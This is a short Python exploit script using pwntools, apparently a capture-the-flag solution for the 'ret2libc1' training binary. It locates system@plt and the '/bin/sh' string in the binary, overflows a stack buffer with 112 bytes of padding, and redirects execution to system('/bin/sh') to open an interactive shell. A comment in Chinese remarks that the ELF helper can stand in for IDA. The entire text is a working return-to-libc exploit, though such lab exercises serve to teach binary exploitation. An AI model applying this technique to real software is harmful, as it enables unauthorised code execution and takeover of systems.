from pwn import *

sh = process("./ret2libc1")
elf = ELF("./ret2libc1")  # elf 可以代替 ida

# binsh = 0x08048720
# systemplt = 0x08048460

systemplt = elf.plt["system"]
binsh = next(elf.search(b"/bin/sh"))

payload = flat([b'a' * 112, systemplt, b'b'* 4, binsh])
# return address = 6c+4 = 108+4 = 112

sh.sendline(payload)
sh.interactive()